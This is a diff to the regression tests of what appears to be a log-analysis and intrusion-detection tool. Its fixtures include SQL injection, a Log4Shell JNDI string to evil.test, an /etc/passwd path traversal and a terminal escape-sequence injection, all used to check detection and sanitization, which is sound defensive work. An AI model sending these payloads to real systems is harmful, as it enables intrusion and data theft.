@@ -1,6 +1,7 @@
 import csv
 import io
 import json as _json
+import os
 import subprocess
 import sys
 import tempfile
@@ -12,8 +13,9 @@ from pathlib import Path
 
 from bla.__version__ import __version__
 from bla.allowlist import apply_allowlist
-from bla.config import THRESHOLDS, Thresholds, load_thresholds, set_thresholds
+from bla.config import DEFAULT_THRESHOLDS, THRESHOLDS, Thresholds, load_thresholds, load_thresholds_from_env, set_thresholds
 from bla.core import AnalysisError, AnalysisOptions, run_analysis
+from bla.core.pipeline import parse_files
 from bla.detection import DetectorRegistry, DetectorSpec, list_detector_names, run_detection
 from bla.detection.engine import _dedup_alerts
 from bla.ioc import extract_iocs, format_ioc_report
@@ -77,7 +79,7 @@ class RegressionTests(unittest.TestCase):
     def test_p0_waf_csv_detects_web_attack(self):
         content = (
             "time,src_ip,host,method,uri,action,rule_id,attack_type,status,user_agent\n"
-            "2024-03-15 10:00:00,8.8.8.8,www.example.com,GET,"
+            "2024-03-15 10:00:00,203.0.113.8,www.example.com,GET,"
             "\"/login?id=1 UNION SELECT NULL--\",block,942100,SQL Injection,403,sqlmap\n"
         )
 
@@ -149,6 +151,61 @@ class RegressionTests(unittest.TestCase):
         self.assertEqual(result.events[0].rule_name, "防火墙放行敏感端口访问")
         self.assertIn("firewall", result.events[0].tags)
         self.assertEqual(result.events[0].port, 3389)
+
+    def test_p0_firewall_missing_action_is_not_reported_as_allowed(self):
+        line = "time=2024-03-15T10:03:00 log_type=firewall src_ip=203.0.113.9 dst_ip=10.0.0.9 dst_port=3389"
+
+        result = parse_p0_security_lines([line], "firewall.log")
+
+        self.assertEqual(len(result.events), 1)
+        self.assertEqual(result.events[0].rule_name, "防火墙敏感端口访问（动作未知）")
+        self.assertEqual(result.events[0].level, ThreatLevel.MEDIUM)
+        self.assertNotIn("exposed-service", result.events[0].tags)
+        self.assertIn("unknown-action", result.events[0].tags)
+
+    def test_p0_vpn_ambiguous_auth_event_is_not_successful_login(self):
+        line = _json.dumps({
+            "log_type": "vpn",
+            "time": "2024-03-15 10:00:00",
+            "user": "alice",
+            "src_ip": "198.51.100.44",
+            "event": "mfa challenge",
+            "message": "用户登录进入 MFA 验证",
+        })
+
+        result = parse_p0_security_lines([line], "vpn.jsonl")
+
+        self.assertEqual(len(result.events), 1)
+        self.assertEqual(result.events[0].rule_name, "VPN 认证事件")
+        self.assertIn("auth-observed", result.events[0].tags)
+        self.assertNotIn("successful-login", result.events[0].tags)
+
+    def test_p0_pretty_json_object_and_jsonl_both_parse(self):
+        pretty = _json.dumps({
+            "log_type": "edr",
+            "time": "2024-03-15 10:04:00",
+            "host": "win-01",
+            "severity": "critical",
+            "alert": "Mimikatz credential dumping",
+        }, ensure_ascii=False, indent=2)
+        jsonl = "\n".join([
+            _json.dumps({"log_type": "vpn", "time": "2024-03-15 10:00:00", "user": "alice", "src_ip": "198.51.100.44", "result": "failed"}),
+            _json.dumps({"log_type": "vpn", "time": "2024-03-15 10:00:01", "user": "alice", "src_ip": "198.51.100.44", "result": "failed"}),
+        ])
+
+        pretty_result = parse_content(pretty, "edr.json", parser_name="p0-security")
+        jsonl_result = parse_content(jsonl, "vpn.jsonl", parser_name="p0-security")
+
+        self.assertEqual(len(pretty_result.events), 1)
+        self.assertEqual(pretty_result.events[0].source, "EDR/XDR")
+        self.assertEqual(len(jsonl_result.events), 2)
+        self.assertTrue(all("failed-login" in event.tags for event in jsonl_result.events))
+
+    def test_p0_invalid_json_records_parse_error(self):
+        result = parse_p0_security_json("{not-json", "bad.json")
+
+        self.assertEqual(result.events, [])
+        self.assertEqual(result.stats.parse_errors, 1)
 
     def test_p0_edr_json_detects_credential_dumping(self):
         content = _json.dumps([{
@@ -226,6 +283,20 @@ class RegressionTests(unittest.TestCase):
         self.assertEqual(result.events[0].rule_name, "自动化扫描/高频访问")
 
         summary = run_detection(result.events)
+        self.assertTrue(any(alert.rule_id == "RECON-003" for alert in summary.alerts))
+
+    def test_web_attack_ip_can_still_create_volume_alert(self):
+        content = "".join(
+            "198.51.100.30 - - [15/Mar/2024:10:00:%02d +0800] "
+            "\"GET /login.php?id=1%%20UNION%%20SELECT%%20NULL-- HTTP/1.1\" 200 10 \"-\" \"sqlmap\"\n" % (i % 60)
+            for i in range(120)
+        )
+
+        result = parse_web_access(content, "access.log")
+        summary = run_detection(result.events)
+
+        self.assertTrue(any(event.category == "流量异常" for event in result.events))
+        self.assertTrue(any(alert.rule_name.startswith("Web攻击:") for alert in summary.alerts))
         self.assertTrue(any(alert.rule_id == "RECON-003" for alert in summary.alerts))
 
     def test_html_report_escapes_attacker_controlled_content_and_stays_offline(self):
@@ -346,7 +417,7 @@ class RegressionTests(unittest.TestCase):
             f"<TimeCreated SystemTime=\"2024-03-15T01:02:{i:02d}.000Z\"/>"
             "<Computer>host</Computer><Channel>Security</Channel></System>"
             "<EventData><Data Name=\"TargetUserName\">alice</Data>"
-            "<Data Name=\"IpAddress\">8.8.8.8</Data>"
+            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
             "<Data Name=\"LogonType\">3</Data></EventData></Event>"
             for i in range(5)
         )
@@ -355,7 +426,7 @@ class RegressionTests(unittest.TestCase):
             "<TimeCreated SystemTime=\"2024-03-15T01:03:00.000Z\"/>"
             "<Computer>host</Computer><Channel>Security</Channel></System>"
             "<EventData><Data Name=\"TargetUserName\">alice</Data>"
-            "<Data Name=\"IpAddress\">8.8.8.8</Data>"
+            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
             "<Data Name=\"LogonType\">3</Data></EventData></Event>"
         )
 
@@ -365,14 +436,14 @@ class RegressionTests(unittest.TestCase):
         self.assertTrue(any("successful-login" in event.tags for event in result.events if event.event_id == "4624"))
         self.assertTrue(any(alert.rule_id == "CN-HVV-002" for alert in summary.alerts))
 
-    def test_run_analysis_rdp_only_keeps_remote_4624_4625_only(self):
+    def test_run_analysis_rdp_only_keeps_logon_type_10_with_remote_source_only(self):
         xml = (
             "<Events>"
             "<Event><System><EventID>4625</EventID>"
             "<TimeCreated SystemTime=\"2024-03-15T01:02:01.000Z\"/>"
             "<Computer>host</Computer><Channel>Security</Channel></System>"
             "<EventData><Data Name=\"TargetUserName\">alice</Data>"
-            "<Data Name=\"IpAddress\">8.8.8.8</Data>"
+            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
             "<Data Name=\"LogonType\">3</Data></EventData></Event>"
             "<Event><System><EventID>4624</EventID>"
             "<TimeCreated SystemTime=\"2024-03-15T01:03:00.000Z\"/>"
@@ -400,10 +471,10 @@ class RegressionTests(unittest.TestCase):
 
         self.assertEqual([event.event_id for event in general.parse_results[0].events], ["4625", "4624", "4624", "4688"])
         result = rdp.parse_results[0]
-        self.assertEqual([event.event_id for event in result.events], ["4625", "4624"])
-        self.assertEqual([event.details.get("source_ip") for event in result.events], ["8.8.8.8", "8.8.4.4"])
-        self.assertEqual(result.stats.total, 2)
-        self.assertEqual(rdp.summary.total_events, 2)
+        self.assertEqual([event.event_id for event in result.events], ["4624"])
+        self.assertEqual([event.details.get("source_ip") for event in result.events], ["8.8.4.4"])
+        self.assertEqual(result.stats.total, 1)
+        self.assertEqual(rdp.summary.total_events, 1)
 
     def test_evtx_missing_python_evtx_blocks_empty_report(self):
         with tempfile.TemporaryDirectory() as tmp:
@@ -424,6 +495,29 @@ class RegressionTests(unittest.TestCase):
         msg = str(ctx.exception)
         self.assertIn("python-evtx", msg)
         self.assertIn("未被解析", msg)
+
+    def test_parse_files_surfaces_partial_file_failures(self):
+        ok = ParseResult("ok.log", "Fixture", [
+            LogEvent(
+                id="ok-1",
+                timestamp="2024-03-15T10:00:00",
+                level=ThreatLevel.INFO,
+                category="测试",
+                source="fixture",
+                source_file="ok.log",
+                message="ok",
+                raw_line="ok",
+            )
+        ], ParseStats(total=1))
+        errors = []
+
+        with mock.patch("bla.core.pipeline.auto_parse", side_effect=[ok, RuntimeError("boom")]):
+            results = parse_files(["ok.log", "bad.log"], jobs=0, quiet=True, errors_out=errors)
+
+        self.assertEqual(results, [ok])
+        self.assertEqual(len(errors), 1)
+        self.assertIn("bad.log", errors[0])
+        self.assertIn("boom", errors[0])
 
     def test_windows_system_account_creation_is_not_persistence_alert(self):
         xml = (
@@ -585,6 +679,22 @@ class RegressionTests(unittest.TestCase):
         self.assertIn("auth-success", event.tags)
         self.assertIsNone(event.mitre_attack)
 
+    def test_windows_4771_feeds_bruteforce_detection(self):
+        xml = "".join(
+            "<Event><System><EventID>4771</EventID>"
+            f"<TimeCreated SystemTime=\"2024-03-15T01:02:{i:02d}.000Z\"/>"
+            "<Computer>dc1</Computer><Channel>Security</Channel></System>"
+            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
+            "<Data Name=\"IpAddress\">198.51.100.77</Data></EventData></Event>"
+            for i in range(5)
+        )
+
+        result = parse_windows_xml(xml, "Security.xml")
+        summary = run_detection(result.events)
+
+        self.assertTrue(all("failed-login" in event.tags for event in result.events))
+        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))
+
     def test_simple_yaml_regex_quotes_do_not_emit_escape_warnings(self):
         text = """
 web_attacks:
@@ -718,6 +828,68 @@ web_attacks:
 
         self.assertIn("终端仅展示前 1 个告警", buf.getvalue())
 
+    def test_terminal_report_strips_attacker_controlled_sequences(self):
+        marker = "\x1b]52;c;SGFja2Vk\x07\x1b[31m"
+        event = LogEvent(
+            id="evt-term-1",
+            timestamp="2024-03-15T10:00:00",
+            level=ThreatLevel.HIGH,
+            category="Web攻击",
+            source="fixture",
+            source_file="access.log",
+            message=f"{marker}message",
+            raw_line=f"raw {marker}",
+            ip="198.51.100.20",
+            details={
+                "method": "GET",
+                "decoded_path": f"/shell.jsp?x={marker}",
+                "user_agent": f"ua {marker}",
+                "referer": f"ref {marker}",
+            },
+            tags=["web-attack"],
+            mitre_attack="T1190",
+            rule_name="测试",
+        )
+        alert = DetectionAlert(
+            id="alert-term-1",
+            rule_id="WEB-TERM",
+            rule_name=f"{marker}Web 控制序列",
+            description=f"desc {marker}",
+            level=ThreatLevel.HIGH,
+            category="Web攻击",
+            mitre_attack="T1190",
+            mitre_phase="初始访问",
+            affected_events=[event.id],
+            evidence=[f"evidence {marker}"],
+            recommendation=f"rec {marker}",
+            timestamp=event.timestamp,
+            confidence="high",
+        )
+        result = ParseResult("access.log", "Fixture", [event], ParseStats(total=1, high=1))
+        summary = AnalysisSummary(
+            risk_score=80,
+            risk_level=ThreatLevel.HIGH,
+            alerts=[alert],
+            timeline=[],
+            attack_chain=[],
+            recommendations=[f"action {marker}"],
+            total_events=1,
+            files_analyzed=1,
+        )
+
+        buf = io.StringIO()
+        old_stdout = sys.stdout
+        try:
+            sys.stdout = buf
+            print_terminal_report([result], summary, no_color=True, full_evidence=True, verbose=True)
+        finally:
+            sys.stdout = old_stdout
+
+        text = buf.getvalue()
+        self.assertNotIn("\x1b]52", text)
+        self.assertNotIn("\x1b[31m", text)
+        self.assertNotIn("\x07", text)
+
     def test_terminal_report_filters_placeholder_top_ip_and_shows_utc8(self):
         result = ParseResult(
             "security.xml",
@@ -812,6 +984,117 @@ web_attacks:
         # n>=20 公网 IP 时 confidence=high；私网降级为 medium
         self.assertEqual(bf[0].confidence, "medium")
         self.assertTrue(any("内网" in e for e in bf[0].evidence))
+
+    def test_bruteforce_requires_failures_inside_time_window(self):
+        spread = [
+            LogEvent(
+                id=f"bf-spread-{i}",
+                timestamp=f"2024-0{i + 1}-01T00:00:00",
+                level=ThreatLevel.MEDIUM,
+                category="认证",
+                source="fixture",
+                source_file="auth.log",
+                message="failed",
+                raw_line="failed",
+                ip="198.51.100.10",
+                user="alice",
+                tags=["failed-login"],
+            )
+            for i in range(5)
+        ]
+        burst = [
+            LogEvent(
+                id=f"bf-burst-{i}",
+                timestamp=f"2024-03-15T10:00:{i:02d}",
+                level=ThreatLevel.MEDIUM,
+                category="认证",
+                source="fixture",
+                source_file="auth.log",
+                message="failed",
+                raw_line="failed",
+                ip="198.51.100.11",
+                user="alice",
+                tags=["failed-login"],
+            )
+            for i in range(5)
+        ]
+
+        self.assertFalse(any(alert.rule_id == "BRUTE-001" for alert in run_detection(spread).alerts))
+        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in run_detection(burst).alerts))
+
+    def test_password_spray_requires_unique_users_inside_time_window(self):
+        spread = [
+            LogEvent(
+                id=f"spray-spread-{i}",
+                timestamp=f"2024-0{i + 1}-01T00:00:00",
+                level=ThreatLevel.MEDIUM,
+                category="认证",
+                source="fixture",
+                source_file="auth.log",
+                message="failed",
+                raw_line="failed",
+                ip="198.51.100.12",
+                user=f"user{i}",
+                tags=["failed-login"],
+            )
+            for i in range(5)
+        ]
+        burst = [
+            LogEvent(
+                id=f"spray-burst-{i}",
+                timestamp=f"2024-03-15T10:00:{i:02d}",
+                level=ThreatLevel.MEDIUM,
+                category="认证",
+                source="fixture",
+                source_file="auth.log",
+                message="failed",
+                raw_line="failed",
+                ip="198.51.100.13",
+                user=f"user{i}",
+                tags=["failed-login"],
+            )
+            for i in range(5)
+        ]
+
+        self.assertFalse(any(alert.rule_id == "SPRAY-001" for alert in run_detection(spread).alerts))
+        self.assertTrue(any(alert.rule_id == "SPRAY-001" for alert in run_detection(burst).alerts))
+
+    def test_cn_hvv_success_after_bruteforce_requires_order(self):
+        success_first = [
+            LogEvent(
+                id="success-first",
+                timestamp="2024-03-15T09:00:00",
+                level=ThreatLevel.INFO,
+                category="认证",
+                source="fixture",
+                source_file="auth.log",
+                message="success",
+                raw_line="success",
+                ip="198.51.100.14",
+                user="alice",
+                tags=["successful-login"],
+            )
+        ]
+        success_first.extend(
+            LogEvent(
+                id=f"late-failure-{i}",
+                timestamp=f"2024-03-15T10:00:{i:02d}",
+                level=ThreatLevel.MEDIUM,
+                category="认证",
+                source="fixture",
+                source_file="auth.log",
+                message="failed",
+                raw_line="failed",
+                ip="198.51.100.14",
+                user="alice",
+                tags=["failed-login"],
+            )
+            for i in range(5)
+        )
+
+        summary = run_detection(success_first, profile="cn-hvv")
+
+        self.assertFalse(any(alert.rule_id == "CN-HVV-002" for alert in summary.alerts))
 
     def test_private_ip_check_only_matches_rfc1918_ranges(self):
         """保留/文档网段不应当被当作内网地址降级。"""
@@ -969,6 +1252,32 @@ web_attacks:
         # 其它字段沿用默认
         self.assertEqual(loaded.spray_min_unique_users, THRESHOLDS.spray_min_unique_users)
 
+    def test_threshold_env_and_config_merge_without_global_state_leak(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            log_path = Path(tmp) / "auth.log"
+            log_path.write_text(
+                "\n".join(
+                    f"Mar 15 09:00:{i:02d} host sshd[1234]: Failed password for bob from 198.51.100.40 port 22 ssh2"
+                    for i in range(4)
+                ) + "\n",
+                encoding="utf-8",
+            )
+            cfg_path = Path(tmp) / "thresholds.json"
+            cfg_path.write_text(_json.dumps({"brute_force_min": 4}), encoding="utf-8")
+
+            try:
+                with mock.patch.dict(os.environ, {
+                    "BLA_THRESHOLD_BRUTE_FORCE_MIN": "99",
+                    "BLA_THRESHOLD_BRUTE_FORCE_HIGH": "6",
+                }):
+                    result = run_analysis(AnalysisOptions(paths=[str(log_path)], config_path=str(cfg_path)), quiet=True)
+            finally:
+                set_thresholds(DEFAULT_THRESHOLDS)
+
+        alert = next(item for item in result.summary.alerts if item.rule_id == "BRUTE-001")
+        self.assertEqual(alert.level, ThreatLevel.MEDIUM)
+        self.assertEqual(load_thresholds_from_env(DEFAULT_THRESHOLDS).brute_force_min, DEFAULT_THRESHOLDS.brute_force_min)
+
     def test_sarif_report_is_valid_and_maps_levels(self):
         """SARIF 输出应当包含 runs/tool/rules/results，且严重告警 → "error"。"""
         content = (
@@ -1039,6 +1348,24 @@ web_attacks:
         self.assertNotIn("/", iocs["file_paths"], "根路径不应进 IOC")
         self.assertNotIn("/index", iocs["file_paths"])
 
+    def test_ioc_rejects_invalid_ip_and_static_asset_prefixes(self):
+        event = LogEvent(
+            id="ioc-invalid",
+            timestamp="2024-03-15T10:00:00",
+            level=ThreatLevel.HIGH,
+            category="测试",
+            source="fixture",
+            source_file="access.log",
+            message="GET /static/app.js from 999.999.999.999",
+            raw_line="999.999.999.999 /static/app.js",
+            ip="999.999.999.999",
+        )
+
+        iocs = extract_iocs([event])
+
+        self.assertNotIn("999.999.999.999", iocs["ips"])
+        self.assertNotIn("/static/app.js", iocs["file_paths"])
+
     def test_ioc_filters_default_domain_blocklist(self):
         """example.com / localhost 不应进入 IOC 域名列表。"""
         content = (
@@ -1070,7 +1397,7 @@ web_attacks:
     def test_builtin_yaml_web_rule_detects_log4shell(self):
         """内置 YAML 规则应参与 Web 检测。"""
         content = (
-            "8.8.8.8 - - [15/Mar/2024:10:00:00 +0800] "
+            "203.0.113.8 - - [15/Mar/2024:10:00:00 +0800] "
             "\"GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.test%2Fa%7D HTTP/1.1\" "
             "200 10 \"-\" \"curl/8\"\n"
         )
@@ -1220,6 +1547,34 @@ web_attacks:
         summary = run_detection([event], pre_enriched=True, detector_registry=registry)
         self.assertEqual([alert.rule_id for alert in summary.alerts], ["REG-001"])
 
+    def test_timeline_is_chronological_not_severity_sorted(self):
+        early_medium = LogEvent(
+            id="early",
+            timestamp="2024-03-15T10:00:00",
+            level=ThreatLevel.MEDIUM,
+            category="测试",
+            source="fixture",
+            source_file="events.log",
+            message="early",
+            raw_line="early",
+            mitre_attack="T1595",
+        )
+        late_critical = LogEvent(
+            id="late",
+            timestamp="2024-03-15T10:05:00",
+            level=ThreatLevel.CRITICAL,
+            category="测试",
+            source="fixture",
+            source_file="events.log",
+            message="late",
+            raw_line="late",
+            mitre_attack="T1190",
+        )
+
+        summary = run_detection([late_critical, early_medium])
+
+        self.assertEqual([item.event_id for item in summary.timeline[:2]], ["early", "late"])
+
     # ---- 实战检测工具化：P0 归一化 / enrich / correlation / golden ----
 
     def test_builtin_rule_metadata_validates_cleanly(self):
@@ -1343,6 +1698,43 @@ web_attacks:
                         KILL_CHAIN_ORDER.index("主机失陷"))
         self.assertLess(KILL_CHAIN_ORDER.index("主机失陷"),
                         KILL_CHAIN_ORDER.index("命令控制"))
+
+    def test_incident_correlation_merges_overlapping_alert_groups(self):
+        from bla.detection.correlation import correlate_incidents
+
+        events = [
+            LogEvent(
+                id=f"corr-{i}",
+                timestamp=f"2024-03-15T10:0{i}:00",
+                level=ThreatLevel.HIGH,
+                category="测试",
+                source="fixture",
+                source_file="events.log",
+                message="event",
+                raw_line="event",
+                ip="198.51.100.60",
+                user="alice" if i < 3 else "bob",
+                host="web1",
+                details={"src_ip": "198.51.100.60", "account": "alice" if i < 3 else "bob", "asset": "web1", "source_type": "waf", "event_family": "initial-access"},
+            )
+            for i in range(4)
+        ]
+        alert_a = DetectionAlert(
+            id="corr-a", rule_id="CORR-A", rule_name="A", description="A",
+            level=ThreatLevel.HIGH, category="测试", mitre_attack="T1190", mitre_phase="初始访问",
+            affected_events=["corr-0", "corr-1"], evidence=[], recommendation="", timestamp="2024-03-15T10:01:00", confidence="high",
+        )
+        alert_b = DetectionAlert(
+            id="corr-b", rule_id="CORR-B", rule_name="B", description="B",
+            level=ThreatLevel.HIGH, category="测试", mitre_attack="T1190", mitre_phase="初始访问",
+            affected_events=["corr-1", "corr-2"], evidence=[], recommendation="", timestamp="2024-03-15T10:02:00", confidence="high",
+        )
+
+        incidents = correlate_incidents(events, [alert_a, alert_b])
+
+        self.assertEqual(len(incidents), 1)
+        self.assertEqual(set(incidents[0].affected_alerts), {"corr-a", "corr-b"})
+        self.assertIn("corr-2", incidents[0].affected_events)
 
     def test_html_report_renders_incident_killchain_chips(self):
         """HTML 报告 incident 卡片必须画出 mini kill chain，命中阶段 chip 高亮。"""
@@ -1484,6 +1876,24 @@ web_attacks:
         self.assertNotIn("python", " ".join(fake.commands).lower())
         self.assertIn("开始本地分析", output.getvalue())
 
+    def test_remote_workspace_bla_exit_on_high_matches_cli_behavior(self):
+        class FakeSSH:
+            target = "web01"
+
+            def fetch_file(self, remote_path, local_path, cwd):
+                Path(local_path).write_text(
+                    "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
+                    "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n",
+                    encoding="utf-8",
+                )
+
+        fake = FakeSSH()
+        with tempfile.TemporaryDirectory() as tmp, mock.patch("sys.stdout", io.StringIO()):
+            workspace = RemoteWorkspace(fake, initial_cwd="/var/log/nginx", print_fn=lambda *a, **k: print(*a, **k))
+            code = workspace.execute_line(f"bla access.log --out {tmp}/case --exit-on high --no-color")
+
+        self.assertEqual(code, 1)
+
     def test_remote_workspace_bla_accepts_rdp_filter(self):
         class FakeSSH:
             target = "win01"
@@ -1622,6 +2032,19 @@ web_attacks:
 
         self.assertEqual(report["meta"]["version"], __version__)
         self.assertEqual(sarif["runs"][0]["tool"]["driver"]["version"], __version__)
+
+    def test_benchmark_memory_profiling_is_explicit(self):
+        repo = Path(__file__).parents[1]
+        completed = subprocess.run(
+            [sys.executable, "bla_cli.py", "benchmark", "--help"],
+            cwd=repo,
+            text=True,
+            capture_output=True,
+            check=True,
+        )
+
+        self.assertIn("--memory", completed.stdout)
+        self.assertIn("tracemalloc", completed.stdout)
 
 
 if __name__ == "__main__":
